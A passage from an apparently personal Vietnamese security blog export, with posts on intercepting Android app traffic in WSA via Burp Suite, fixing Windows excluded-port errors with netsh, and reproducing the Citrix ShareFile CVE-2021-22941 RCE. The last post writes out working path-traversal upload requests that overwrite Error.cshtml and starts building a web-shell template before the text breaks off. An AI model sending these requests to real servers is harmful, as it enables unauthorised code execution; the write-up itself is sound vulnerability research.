ƒë·ªông chuy·ªÉn c√°i cert ƒë√≥ v√†o Trusted Root, vi·ªác l√†m c·ªßa b·∫°n l√† c√†i ƒë·∫∑t Cert cho user nh∆∞ b√¨nh th∆∞·ªùng, sau ƒë√≥ ti·∫øn h√†nh kh·ªüi ƒë·ªông l·∫°i WSA l√† ƒë∆∞·ª£c  1 ƒëi·ªÉm m√¨nh th√≠ch ·ªü WSA l√† qu√° tr√¨nh turn off hay start ƒë·ªÅu kh√° l√† nhanh (m√¨nh ƒëang kh√¥ng mu·ªën n√≥i l√† r·∫•t nhanh so v·ªõi emulator :\u0026lt;)\n S·ª≠ d·ª•ng Root Certificate Manager Do WSA ƒë√£ ƒë∆∞·ª£c root, n√™n c√°c b·∫°n c√≥ th·ªÉ s·ª≠ d·ª•ng app ƒë·ªÉ l√†m thay m√¨nh lu√¥n c≈©ng ƒë∆∞·ª£c\nRoot Certificate Manager APK (ROOT) 1.0.1 (·ª®ng d·ª•ng Android) - T·∫£i v·ªÅ (apkcombo.com)\nTi·∫øn h√†nh c√†i ƒë·∫∑t, c·∫•p quy·ªÅn root cho ·ª©ng d·ª•ng, t·∫£i v√† load cert c·ªßa Burp Suite v√†o, th·∫ø l√† xong r·ªìi :D\nC√†i ƒë·∫∑t ProxyDroid ProxyDroid APK 3.2.0 (·ª®ng d·ª•ng Android) - T·∫£i v·ªÅ (apkcombo.com)\nApp n√†y ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ ƒëi·ªÅu h∆∞·ªõng c√°c request c·ªßa c√°c app kh√°c t·ªõi proxy (y√™u c·∫ßu root), c√≥ th·ªÉ ch·ªçn c√°c ·ª©ng d·ª•ng n√†o m√¨nh mu·ªën ƒëi·ªÅu h∆∞·ªõng th√¥ng qua profiles, kh√° ti·ªán.\n C·∫£m ∆°n anh @vigov5 ƒë√£ suggest app n√†y ·∫° :D\n Ph·∫ßn Host v√† Port c√°c b·∫°n ƒë·ªÉ c√°i ip m·∫°ng LAN m√°y th·∫≠t nh√©, t·∫°i WSA m·ªói l·∫ßn kh·ªüi ƒë·ªông l·∫°i l√† 1 IP ri√™ng, vi·ªác set c√°i IP m√°y th·∫≠t ƒë·ªÉ tr√°nh vi·ªác m·ªói l·∫ßn kh·ªüi ƒë·ªông l·∫°i WSA b·ªã thay ƒë·ªïi IP\nTr√™n Burp Suite c≈©ng th·ª±c hi·ªán c√†i ƒë·∫∑t l·∫Øng nghe t∆∞∆°ng ·ª©ng.\nM·ªü app l√™n ph√°t l√† capture ƒë∆∞·ª£c ngay :joy:\nM·ªçi v·∫•n ƒë·ªÅ c√°c b·∫°n c√≥ th·ªÉ comment b√™n d∆∞·ªõi nh√©, m√¨nh c√≥ th·ªÉ gi·∫£i ƒë√°p. See you.\nV·∫•n ƒë·ªÅ Khi m√† m√¨nh login t√†i kho·∫£n google v√†o, th√¨ m√¨nh b·ªã l·ªói nh∆∞ h√¨nh d∆∞·ªõi (trong khi ch∆∞a login th√¨ kh√¥ng b·ªã) M√¨nh v·∫´n ƒëang t√¨m hi·ªÉu nguy√™n nh√¢n, k bi·∫øt Android c√≥ c∆° ch·∫ø g√¨ ƒë·ªÉ b·∫£o v·ªá n√≥ kh√¥ng :\u0026lt;\nTham kh·∫£o  https://sensepost.com/blog/2021/android-application-testing-using-windows-11-and-windows-subsystem-for-android/ https://github.com/LSPosed/MagiskOnWSA https://github.com/alesimula/wsa_pacman https://github.com/NVISOsecurity/MagiskTrustUserCerts  ","permalink":"https://minhtuanact.ml/posts/cai-dat-wsa-windows-subsystem-for-android-de-su-dung-android-tren-windows-cai-dat-android-emulator-sao-cho-ngau-part-2/","summary":"Ng√†y x·ª≠a ng√†y x∆∞a m√¨nh c√≥ 1 ∆∞·ªõc ao \u0026ldquo;l√†m th·∫ø n√†o ƒë·ªÉ Windows + Linux ho√† v√†o l√†m m·ªôt nh·ªâ\u0026rdquo;, v√† r·ªìi WSL ƒë∆∞·ª£c sinh ra v√†o h·ªìi 5 nƒÉm tr∆∞·ªõc. Tuy c√≤n kh√° sida v√† l·∫Øm l·ªói, tuy nhi√™n v√†o nƒÉm 2019 WSL2 ra ƒë·ªùi c√πng v·ªõi s·ª≠ d·ª•ng kernel linux ch√≠nh ng·∫°ch c√πng v·ªõi c√°c thay ƒë·ªïi g·∫ßn ƒë√¢y ƒë√£ l√†m WSL2 ho√†n thi·ªán h∆°n (nh·∫•t l√† m·ªõi c√≥ t√≠nh nƒÉng Run Linux GUI apps s·ª≠ d·ª•ng X11 tr√™n Windows 11 Run Linux GUI apps with WSL | Microsoft Docs)","title":"C√†i ƒë·∫∑t WSA (Windows Subsystem for Android) ƒë·ªÉ s·ª≠ d·ª•ng Android tr√™n Windows - C√†i ƒë·∫∑t Android Emulator sao cho ng·∫ßu (part 2)"},{"content":"M·ªü ƒë·∫ßu Ch√†o c√°c b·∫°n, sau c√°i b√†i X·ª≠ l√Ω v·∫•n ƒë·ªÅ \u0026ldquo;Port Already in Use\u0026rdquo; tr√™n Linux v√† Windows  th√¨ m√¨nh l·∫°i g·∫∑p 1 tr∆∞·ªùng h·ª£p n·ªØa, c√°i tr∆∞·ªùng h·ª£p n√†y n√≥ x·∫£y ra qu√° l√¢u r·ªìi v√† do m√¨nh l∆∞·ªùi fix n√™n n√≥ v·∫´n c√≤n ƒë√≥, c√°ch ƒë√¢y kho·∫£ng 10 ng√†y th√¨ m√¨nh fix ƒë∆∞·ª£c r·ªìi. Ch√≠nh v√¨ th·∫ø m√¨nh vi·∫øt l√™n ƒë√¢y v·ª´a l√† chia s·∫ª, v·ª´a l√† note l·∫°i cho b·∫£n th√¢n ƒë·ªÉ sau n√†y l·ª° b·ªã l·∫°i th√¨ c√≥ l·ªánh x√†i lu√¥n cho nhanh :joy:\nNguy√™n nh√¢n V·∫•n ƒë·ªÅ n√†y n√≥ c≈©ng gi·ªëng vi·ªác b·ªã s·ª≠ d·ª•ng port b·ªüi service kh√°c r·ªìi, nh∆∞ng m√† v·ªõi th√¥ng b√°o kh√°c. M√¨nh v√≠ d·ª• v·ªõi Docker v√¨ m√¨nh s·ª≠ d·ª•ng Docker m·ªü port kh√° nhi·ªÅu\n1 2 3  docker run -it --rm -p 8080:8080 httpd:2.4.49 docker: Error response from daemon: Ports are not available: listen tcp 0.0.0.0:8080: bind: An attempt was made to access a socket in a way forbidden by its access permissions. ERRO[0000] error waiting for container: context canceled   Nh∆∞ c√°c b·∫°n c√≥ th·ªÉ th·∫•y, m√¨nh kh√¥ng th·ªÉ mapping port 8080 t·ª´ Container ra b√™n ngo√†i m√°y m√¨nh, n√≥ b√°o l·ªói Ports are not available An attempt was made to access a socket in a way forbidden by its access permissions. Ban ƒë·∫ßu th√¨ m√¨nh c≈©ng nghƒ© n√≥ b·ªã tr√πng port ·ªü ƒë√¢u th√¥i, check th√¨ ch·∫≥ng c√≥ c√°i service n√†o ƒëang ch·∫°y ·ªü 8080 c·∫£, th·∫ø m√† v·∫´n b·ªã ch·∫∑n :|.\nTr∆∞·ªõc m√¨nh c≈©ng c√≥ vi·∫øt 1 b√†i debug Gitlab, m√¨nh c≈©ng b·ªã c√°i l·ªói phi·ªÅn ph·ª©c n√†y kh√¥ng cho m·ªü port 3000, c√°c b·∫°n c√≥ th·ªÉ ƒë·ªçc l·∫°i t·∫°i ph·∫ßn n√†y Setup debug Gitlab, t∆∞·ªüng kh√¥ng kh√≥ m√† c≈©ng kh√¥ng kh√≥ l·∫Øm - Extend. V√† m√¨nh ƒë√£ t·∫°m th·ªùi fix b·∫±ng vi·ªác xo√° c√°i port ƒëang b·ªã Excluded ƒë√≥ ƒëi b·∫±ng l·ªánh\n1 2 3  net stop winnat netsh interface ipv4 delete excludedportrange protocol=tcp startport=2972 numberofports=100 net start winnat   V·∫•n ƒë·ªÅ m√°y m√¨nh ·ªü ƒë√¢y b·ªã excluded port qu√° nhi·ªÅu, kh√¥ng th·ªÉ fix b·∫±ng c√°i c√°ch ƒë√≥ ƒë∆∞·ª£c, m√¨nh c√≥ th·ªÉ show ra ƒë√¢y cho c√°c b·∫°n c√≥ th·ªÉ th·∫•y\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137  ‚ûú ~ netsh interface ipv4 show excludedportrange protocol=tcp Protocol tcp Port Exclusion Ranges Start Port End Port ---------- -------- 1061 1160 1161 1260 1361 1460 1461 1560 1561 1660 1661 1760 1761 1860 1861 1960 1961 2060 2061 2160 2180 2279 2280 2379 2380 2479 2480 2579 2618 2717 2718 2817 2918 3017 3018 3117 3118 3217 3218 3317 3318 3417 3418 3517 3605 3704 3705 3804 3805 3904 3905 4004 4005 4104 4105 4204 4205 4304 4305 4404 4584 4683 4685 4784 4785 4884 4885 4984 5041 5140 5141 5240 5241 5340 5357 5357 5404 5503 5504 5603 5604 5703 5704 5803 5804 5903 5940 6039 6040 6139 6140 6239 6240 6339 6340 6439 6440 6539 6540 6639 6640 6739 6740 6839 6840 6939 6940 7039 7040 7139 7140 7239 7323 7422 7423 7522 7523 7622 7681 7780 7847 7946 7947 8046 8047 8146 8147 8246 8247 8346 8411 8510 8519 8618 8623 8722 8723 8822 8823 8922 9014 9113 9114 9213 9214 9313 9314 9413 9488 9587 9588 9687 9689 9788 9789 9888 9889 9988 9989 10088 10188 10287 10288 10387 10388 10487 10551 10650 10656 10755 10758 10857 10858 10957 10958 11057 11058 11157 11158 11257 11258 11357 11358 11457 11459 11558 11560 11659 11660 11759 11760 11859 11863 11962 11963 12062 12063 12162 12163 12262 12265 12364 12447 12546 12547 12646 12647 12746 12747 12846 12847 12946 13033 13132 13133 13232 13233 13332 13333 13432 13433 13532 13533 13632 13703 13802 13803 13902 13903 14002 14003 14102 14103 14202 14203 14302 14303 14402 14403 14502 14503 14602 14604 14703 14704 14803 14804 14903 27339 27339 50000 50059 * * - Administered port exclusions.   B·ªã Port Exclusion Ranges t·ª´ port 1061 ƒë·∫øn t·∫≠n 14903, qu√° nhi·ªÅu m√† k bi·∫øt ƒë·ªÉ l√†m g√¨, c·ª±c k·ª≥ kh√≥ ch·ªãu. Sau m·ªôt h√¥m than th·ªü v·ªõi ng∆∞·ªùi anh t√™n Ph∆∞∆°ng gi·∫•u t√™n, anh b·∫£o l√† do Hyper-V hay sao ·∫•y, anh ·∫•y kh√¥ng b·ªã l·ªói gi·ªëng m√¨nh. V√¨ l√∫c kh·ªüi ƒë·ªông m√°y l√™n th√¨ n√≥ exclusion √≠t l·∫Øm, khi m·ªü Docker (Docker ch·∫°y base WSL2 s·ª≠ d·ª•ng Hyper-V) l√™n th√¨ exclusion nhi·ªÅu th·∫ø kia, n√™n m√¨nh c≈©ng ng·ªù ng·ª£ r·ªìi.\nNg∆∞·ªùi anh Ph∆∞∆°ng gi·∫•u t√™n kia c√≥ g·ª≠i cho m√¨nh 1 link github v·ªÅ issue gi·ªëng m√¨nh, b·∫°n ƒë·ªçc c√≥ th·ªÉ ƒë·ªçc t·∫°i https://github.com/microsoft/WSL/issues/5306. Sau khi reseearch m·ªôt h·ªìi th√¨ m√¨nh bi·∫øt nguy√™n nh√¢n l√† do ƒë√¢u, v√† v·∫•n ƒë·ªÅ n√†y ƒë∆∞·ª£c recommend gi·∫£i quy·∫øt t·ª´ nƒÉm 2019 (th·∫ø m√† c√≤n l∆∞·ªùi kh√¥ng research ƒë·ªÉ fix - ch√°n b·∫£n th√¢n :\u0026lt;)\n https://github.com/docker/for-win/issues/3171#issuecomment-554587817\n V·∫≠y th√¨ nguy√™n nh√¢n ·ªü ƒë√¢y kh√¥ng ph·∫£i do Docker, c≈©ng ch·∫≥ng ph·∫£i do Hyper-V hay WSL2, nguy√™n nh√¢n l√† do Windows update l·ªói, d·∫´n t·ªõi n√≥ c·∫≠p nh·∫≠t lu√¥n dynamic port range t·ª´ 1024 lu√¥n. Dynamic port range ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ Windows c√≥ th·ªÉ s·ª≠ d·ª•ng nh·ªØng port ƒë√≥ l√†m g√¨ ƒë·∫•y m√† kh√¥ng cho th·∫±ng n√†o kh√°c s·ª≠ d·ª•ng c·∫£. B·∫±ng m·ªôt c√°ch th·∫ßn b√≠ n√†o ƒë·∫•y n√≥ set dynamic port range v·ªÅ 1024. B·∫°n ƒë·ªçc c√≥ th·ªÉ check dynamic port ƒëang ƒë∆∞·ª£c set ·ªü gi√° tr·ªã n√†o th√¥ng qua c√¢u l·ªánh\n1 2 3 4 5 6  ‚ûú ~ netsh int ipv4 show dynamic protocol=tcp Protocol tcp Dynamic Port Range --------------------------------- Start Port : 1024 Number of Ports : 13977   V√† k·∫øt qu·∫£ tr√™n l√† c√°i setting m√† khi·∫øn m√¨nh kh·ªën ƒë·ªën bao l√¢u nay\nK·∫øt th√∫c chu·ªói h√†nh tr√¨nh ƒë·∫ßy ch√¥ng gai C·∫£m ∆°n c√°c b·∫°n ƒë√£ ƒë·ªçc ƒë·∫øn ƒë√¢y, v√† ƒë√¢y l√† 1 c√¢u l·ªánh duy nh·∫•t khi·∫øn c√°c b·∫°n kh√¥ng c√≤n kh·ªï s·ªü nh∆∞ m√¨nh n·ªØa\n1  netsh int ipv4 set dynamic tcp start=49152 num=16384   ƒê∆°n gi·∫£n l√† set dynamic ranger port v·ªÅ gi√° tr·ªã ban ƒë·∫ßu v·ªën c√≥ c·ªßa n√≥, sau ƒë√≥ restart m√°y l√† xong, ƒë∆°n gi·∫£n v·∫≠y th√¥i.\nC·∫©n th·∫≠n h∆°n th√¨ c√≥ th·ªÉ check l·∫°i\n1 2 3 4 5 6  ‚ûú ~ netsh int ipv4 show dynamic protocol=tcp Protocol tcp Dynamic Port Range --------------------------------- Start Port : 49152 Number of Ports : 16384   Ch√∫c c√°c b·∫°n ƒë·ª° kh·ªï s·ªü v·ªÅ v·∫•n ƒë·ªÅ n√†y n·ªØa, see you :joy:\nTham kh·∫£o  https://github.com/microsoft/WSL/issues/5306 https://github.com/docker/for-win/issues/3171 https://stackoverflow.com/questions/48478869/cannot-bind-to-some-ports-due-to-permission-denied/62061654#62061654  ","permalink":"https://minhtuanact.ml/posts/phai-lam-gi-khi-ports-are-not-available-tren-dockercac-service-khac/","summary":"M·ªü ƒë·∫ßu Ch√†o c√°c b·∫°n, sau c√°i b√†i X·ª≠ l√Ω v·∫•n ƒë·ªÅ \u0026ldquo;Port Already in Use\u0026rdquo; tr√™n Linux v√† Windows  th√¨ m√¨nh l·∫°i g·∫∑p 1 tr∆∞·ªùng h·ª£p n·ªØa, c√°i tr∆∞·ªùng h·ª£p n√†y n√≥ x·∫£y ra qu√° l√¢u r·ªìi v√† do m√¨nh l∆∞·ªùi fix n√™n n√≥ v·∫´n c√≤n ƒë√≥, c√°ch ƒë√¢y kho·∫£ng 10 ng√†y th√¨ m√¨nh fix ƒë∆∞·ª£c r·ªìi. Ch√≠nh v√¨ th·∫ø m√¨nh vi·∫øt l√™n ƒë√¢y v·ª´a l√† chia s·∫ª, v·ª´a l√† note l·∫°i cho b·∫£n th√¢n ƒë·ªÉ sau n√†y l·ª° b·ªã l·∫°i th√¨ c√≥ l·ªánh x√†i lu√¥n cho nhanh :joy:","title":"Ph·∫£i l√†m g√¨ khi \"Ports are not available\" tr√™n Docker/c√°c service kh√°c ü§ß"},{"content":"C√°i b√†i n√†y m√¨nh ƒë·ªãnh l√™n t·ª´ nƒÉm ngo√°i r·ªìi, m√† ph√¢n t√≠ch xong l·∫°i ƒë·ªÉ ƒë·∫•y, th·∫≠t ra l√† l∆∞·ªùi vi·∫øt l·∫°i n√™n t·ªìn ƒë·ªçng ƒë·∫øn b√¢y gi·ªù ch∆∞a vi·∫øt b√†i ph√¢n t√≠ch l√™n blog ü•≤. Th√¥i th√¨ ng·ªìi vi·∫øt l·∫°i v·ª´a ƒë·ªÉ c√≥ ch·ªó l∆∞u l·∫°i, v·ª´a ƒë·ªÉ nh·ªõ xem m√¨nh ƒë√£ ph√¢n t√≠ch nh·ªØng c√°i g√¨, bi·∫øt ƒë√¢u sau n√†y l·∫°i s·ª≠ d·ª•ng l·∫°i th√¨ sao :D\nB√†i n√†y m√¨nh d·ª±a theo b√†i vi·∫øt g·ªëc c·ªßa code white, c≈©ng ch√≠nh l√† nh√≥m ph√°t hi·ªán ra CVE n√†y, b·∫°n ƒë·ªçc c√≥ th·ªÉ ƒë·ªçc b√†i vi·∫øt g·ªëc t·∫°i https://codewhitesec.blogspot.com/2021/09/citrix-sharefile-rce-cve-2021-22941.html\nSetup ·ªû ƒë√¢y m√¨nh setup tr√™n 1 Windows Server 2019, s·ª≠ d·ª•ng Hyper-V cho n√≥ nhanh, c√°c b·∫°n c·ª© t·∫£i c√°i file VHD kia v·ªÅ r·ªìi import v√†o Hyper-V Manager l√† ch·∫°y l√™n lu√¥n nh√©, nhanh l·∫Øm.\nhttps://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2019 C√†i ƒë·∫∑t Citrix Sharefile th√¨ ƒë∆°n gi·∫£n l·∫Øm, t·∫£i phi√™n b·∫£n StorageCenter_5.11.19, sau ƒë√≥ b·∫•m next next next, cho ƒë·∫øn khi n√†o n√≥ hi·ªÉn th·ªã l√™n trang configure l√† ƒë∆∞·ª£c\nDebug Xong ph·∫ßn c√†i ƒë·∫∑t, ƒë·∫øn ph·∫ßn debug th√¨ ·ªü ƒë√¢y m√¨nh s·ª≠ d·ª•ng JetBrains Rider ƒë·ªÉ debug, c√°c b·∫°n c≈©ng c√≥ th·ªÉ s·ª≠ d·ª•ng th√™m c·∫£ DnsSpy ƒë·ªÉ v·∫Ω map ƒëi trace chain cho d·ªÖ d√†ng h∆°n :D\nM·ªü Rider l√™n r·ªìi Attach to Process t·ªõi process w3wp ƒê·ª£i 1 t√Ω l√† n√≥ load nh·ªØng th√†nh ph·∫ßn c·∫ßn thi·∫øt v√†o, ch√∫ √Ω n√™n s·ª≠ d·ª•ng SSD ƒë·ªÉ load project cho nhanh nh√©, ch·ª© HDD load l√¢u l·∫Øm :(\nPh√¢n t√≠ch Nh∆∞ ·ªü b√†i vi·∫øt g·ªëc c√≥ th·ªÉ th·∫•y t√°c gi·∫£ ƒë√£ ch·ªâ ra r·∫±ng Citrix Sharefile c√≥ s·ª≠ d·ª•ng NeatUpload c√≥ ni√™n ƒë·∫°i t·ªõi h√†ng ch·ª•c nƒÉm, v√¨ n√≥ l√† th∆∞ vi·ªán s·ª≠ d·ª•ng ƒë·ªÉ upload n√™n t√°c gi·∫£ ƒë√£ t√¨m ƒë∆∞·ª£c ch·ªó s·ª≠ d·ª•ng ƒë·ªÉ ghi file l√™n h·ªá th·ªëng\nB·∫±ng c√°ch s·ª≠ d·ª•ng t√≠nh nƒÉng Analyzer tr√™n DnSpy ch√∫ng ta c√≥ th·ªÉ t√¨m nhanh ch√≥ng t·ª´ Sink ƒë·∫øn Source nh∆∞ sau (tr√™n Rider c≈©ng c√≥ t√≠nh nƒÉng Find Usages ho·∫°t ƒë·ªông t∆∞∆°ng t·ª±, nh∆∞ng m√† m√¨nh th√≠ch s·ª≠ d·ª•ng c√°i Analyzer tr√™n DnSpy h∆°n v√¨ n√≥ v·∫Ω c√°i map cho m√¨nh nh√¨n cho n√≥ tr·ª±c quan)\nV·∫≠y ch√∫ng ta c√≥ th·ªÉ th·∫•y r·∫±ng, ƒë·ªÉ upload file l√™n server th√¨ c√≥ th·ªÉ s·ª≠ d·ª•ng Brettle.Web.NeatUpload.UploadHttpModule.Init (HttpApplication), l√† ph∆∞∆°ng th·ª©c kh·ªüi t·∫°o cho System.Web.IHttpModule\nSau khi ki·ªÉm tra file Web.config th√¨ c√≥ th·ªÉ th·∫•y r·∫±ng UploadHttpModule ƒë∆∞·ª£c n·∫°p tr·ª±c ti·∫øp v√†o danh s√°ch Module trong webapp\nV·∫≠y ta c√≥ th·ªÉ t√¨m ƒë∆∞·ª£c endpoint upload file tr·ª±c ti·∫øp l√™n h·ªá th·ªëng th√¥ng qua Application_BeginRequest()\nNh∆∞ h√¨nh tr√™n ta c√≥ th·ªÉ th·∫•y ƒë∆∞·ª£c source s·∫Ω c√≥ d·∫°ng\n1 2 3  POST /upload.aspx HTTP/1.1 Host: localhost Content-Length: 0   C√≥ endpoint r·ªìi th√¨ data truy·ªÅn v√†o s·∫Ω l√† g√¨ b√¢y gi·ªù nh·ªü ·ªû Brettle.Web.NeatUpload.FilteringWorkerRequest.ParseOfThrow ch√∫ng ta c√≥ 1 ƒëo·∫°n nh∆∞ n√†y\nC√≥ th·ªÉ th·∫•y ƒë·ªÉ uploadContext th√¨ ch√∫ng ta c·∫ßn s·ª≠ d·ª•ng Content-Type: multipart/form-data s·ª≠ d·ª•ng bonudary. V√≠ d·ª•:\n1 2 3 4 5 6  POST /upload.aspx HTTP/1.1 Host: localhost Content-Type: multipart/form-data; boundary=xxx --xxx \u0026lt;c√°i g√¨ ƒë·∫•y\u0026gt; --xxx--   C≈©ng v·∫´n ·ªü Brettle.Web.NeatUpload.FilteringWorkerRequest.ParseOfThrow ta c√≥ th·ªÉ th·∫•y GetAttribute name v√† filename, s·ª≠ d·ª•ng Content-Disposition attachment\nV·∫≠y request s·∫Ω l√†:\n1 2 3 4 5 6 7  POST /upload.aspx HTTP/1.1 Host: localhost Content-Type: multipart/form-data; boundary=xxx --xxx Content-Disposition: form-data; name=\u0026#34;name\u0026#34;; filename=\u0026#34;filename\u0026#34; \u0026lt;c√°i g√¨ ƒë·∫•y n·ªØa\u0026gt; --xxx--   Tuy nhi√™n, v·∫´n t·∫°i ƒë√≥, ch√∫ng ta c·∫ßn th√™m nh·ªØng paramsFromQueryString nh∆∞ uploadtool, bd, accountid nh∆∞ng sau nh·ªØng l·∫ßn test c·ªßa m√¨nh th√¨ ch√∫ng ta ch·ªâ c·∫ßn th√™m 2 param bp v·ªõi accountid m√† th√¥i M·∫∑t kh√°c, ch√∫ng ta c√≥ m·ªôt d√≤ng\n1  bool flag1 = fieldNameTranslator.PostBackID.Contains(\u0026#34;rsu\u0026#34;);   ·ªû ƒë√¢y ch√∫ng ta c·∫ßn ph·∫£i ch√®n th√™m gi√° tr·ªã PostBackID, sau m·ªôt h·ªìi debug th√¨ ho√° ra l√† n√≥ n·∫±m trong config c·ªßa webapp, l·∫ßn m√≤ 1 h·ªìi th√¨ c≈©ng ƒë·∫øn ƒë∆∞·ª£c ch·ªó c·∫ßn t√¨m Brettle.Web.NeatUpload.FieldNameTranslator\nCu·ªëi c√πng sau m·ªôt h·ªìi debug, th√¨ request cu·ªëi c√πng c√≥ l·∫Ω s·∫Ω l√† nh∆∞ n√†y:\n1 2 3 4 5 6 7 8  POST /upload.aspx?id=foo\u0026amp;bp=bp\u0026amp;accountId=accountid HTTP/1.1 Host: localhost Content-Type: multipart/form-data; boundary=xxx --xxx Content-Disposition: form-data; name=\u0026#34;name\u0026#34;; filename=\u0026#34;filename\u0026#34; \u0026lt;c√°i g√¨ ƒë·∫•y n·ªØa\u0026gt; --xxx--   Post th·ª≠ request l√™n r·ªìi check ph·∫ßn sink xem sao\nC√≥ th·ªÉ th·∫•y r·∫±ng ph·∫ßn PostBackID hi·ªán t·∫°i v·∫´n ƒëang l√† null, c√≥ v·∫ª nh∆∞ m√¨nh v·∫´n ch∆∞a truy·ªÅn ƒë∆∞·ª£c param id=foo. Sau m·ªôt h·ªìi debug, th√¨ ho√° ra do c√°i ƒëo·∫°n n√†y, m√¨nh v·∫´n ch∆∞a ƒë·ªçc k·ªπ xem t·∫°i sao ph·∫£i truy·ªÅn s·ªë byte \u0026gt; 4096 bytes n·ªØa th√¨ n√≥ m·ªõi ƒÉn, c·ª© ƒëo√°n v·∫≠y th√¥i.\nSau khi truy·ªÅn ƒë∆∞·ª£c PostBackID v√†o FileStream r·ªìi th√¨ c√≥ th·ªÉ th·∫•y r·∫±ng file foo ƒë√£ ƒë∆∞·ª£c ghi v√†o trong folder C:\\inetpub\\wwwroot\\Citrix\\StorageCenter\\context v·ªõi n·ªôi dung nh∆∞ h√¨nh d∆∞·ªõi.\nV·∫≠y l√†m th·∫ø n√†o ƒë·ªÉ RCE b√¢y gi·ªù ü§î\n·ªû ƒëo·∫°n code\n1  FileStream fileStream = new FileStream(str + this.PostBackID, FileMode.Create, FileAccess.ReadWrite, FileShare.None);   C√≥ th·ªÉ th·∫•y r·∫±ng, path ƒë∆∞·ª£c gh√©p b·ªüi str=C:\\inetpub\\wwwroot\\Citrix\\StorageCenter\\context + PostBackID. Bi·∫øn PostBackID th√¨ c√≥ th·ªÉ control ƒë∆∞·ª£c, v·∫≠y th·ª≠ path travesal xem sao :D\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  POST /upload.aspx?id=../foo\u0026amp;bp=bp\u0026amp;accountId=123 HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Edg/94.0.992.47 Accept-Encoding: gzip, deflate Accept: */* Connection: close Content-Length: 4240 Content-Type: multipart/form-data; boundary=b74bf37b7d0548a0280c058e21597abd --b74bf37b7d0548a0280c058e21597abd Content-Disposition: form-data; name=\u0026#34;name\u0026#34;; filename=\u0026#34;filename\u0026#34; \u0026lt;4096 ch·ªØ A ·ªü ƒë√¢y nh√©\u0026gt; --b74bf37b7d0548a0280c058e21597abd--   V√† ta nh·∫≠n ƒë∆∞·ª£c file foo ƒë√£ nh·∫£y ra b√™n ngo√†i folder content v·ªõi n·ªôi dung nh∆∞ tr√™n h√¨nh.\n·ªú th√¨ gi·ªù path travesal ƒë∆∞·ª£c r·ªìi th√¨ l√†m sao nh·ªü, sau ƒë·ªçc b√†i c·ªßa code white, h·ªç ƒë√£ c√≥ g·ª£i √Ω cho m√¨nh l√† s·ª≠ d·ª•ng ghi ƒë√® l√™n file template c·ªßa m√¥ h√¨nh MVC .cshtml ƒë·ªÉ c√≥ th·ªÉ k√≠ch ho·∫°t l√™n shell\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  POST /upload.aspx?id=..%2FConfigService%2FViews%2FShared%2FError.cshtml\u0026amp;bp=bp\u0026amp;accountId=123z HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Edg/94.0.992.47 Accept-Encoding: gzip, deflate Accept: */* Connection: close Content-Length: 4240 Content-Type: multipart/form-data; boundary=4b6955d42c8c6d258f047410fbb3fc12 --4b6955d42c8c6d258f047410fbb3fc12 Content-Disposition: form-data; name=\u0026#34;name\u0026#34;; filename=\u0026#34;filename\u0026#34; \u0026lt;4096 ch·ªØ A ·ªü ƒë√¢y nh√©\u0026gt; --4b6955d42c8c6d258f047410fbb3fc12--   Ngon ro√†i, v·∫≠y gi·ªù m√¨nh c√≥ th·ªÉ ghi ƒë√® l√™n file Error.cshtml, tuy nhi√™n gi·ªù data m√¨nh truy·ªÅn v√†o duy nh·∫•t l√† bi·∫øn id m√† th√¥i, sau m·ªôt h·ªìi ƒë·ªçc g·ª£i √Ω c·ªßa code white m√† m√¨nh m∆° m∆° m√†ng m√†ng ch·∫≥ng hi·ªÉu g√¨ c·∫£. Nh∆∞ng m√† sau v·∫´n lƒ©nh h·ªôi ƒë∆∞·ª£c üòÅ\nT·∫°o payload Gi·∫£i th√≠ch th·∫ø n√†y m·ªôt ch√∫t cho d·ªÖ hi·ªÉu, tr√™n Linux v√† Windows, vi·ªác chu·∫©n ho√° PATH l√† kh√°c nhau. V√≠ d·ª•:\n Linux: cd a/b/c/ th√¨ Linux s·∫Ω ki·ªÉm tra path a, path a/b, path a/b/c c√≥ t·ªìn t·∫°i hay kh√¥ng, n·∫øu c√≥ th√¨ th·ª±c hi·ªán l·ªánh th√†nh c√¥ng. Windows: cd a/b/c th√¨ Windows s·∫Ω th·ª±c hi·ªán chu·∫©n ho√° path a/b/c xem c√≥ t·ªìn t·∫°i hay kh√¥ng, n·∫øu c√≥ th√¨ th·ª±c hi·ªán l·ªánh th√†nh c√¥ng.  V·∫≠y b·∫°n th·ª≠ cd aaa/../a/b/c tr√™n Linux v√† Windows xem, tr√™n Windows th√¨ ch·∫°y ƒë∆∞·ª£c l·ªánh n√†y c√≤n Linux b√°o k c√≥ directory n√†o t·ªìn t·∫°i ngay üòÇ. V√¨ Linux n√≥ s·∫Ω ki·ªÉm tra folder aaa/ c√≥ t·ªìn t·∫°i kh√¥ng ƒë√£, r·ªìi n√≥ m·ªõi ch·∫°y ti·∫øp, n·∫øu k t·ªìn t·∫°i th√¨ th√¥i, Windows l·∫°i kh√°c, aaa/.../a/b/c =\u0026gt; a/b/c c√≥ t·ªìn t·∫°i th√¨ ch·∫°y ƒë∆∞·ª£c b√¨nh th∆∞·ªùng.\nB√¢y gi·ªù ch√∫ng ta c·∫ßn vi·∫øt ra 1 c√°i template file .cshtml ƒë·ªÉ c√≥ th·ªÉ ch·∫°y shell tr√™n n√†y, kh√¥ng ƒë∆∞·ª£c ch·ª©a c√°c k√Ω t·ª±\n1 2 3 4 5 6 7 8 9  \u0026lt; (less than) \u0026gt; (greater than) : (colon) \u0026#34; (double quote) / (forward slash) \\ (backslash) | (vertical bar or pipe) ? (question mark) * 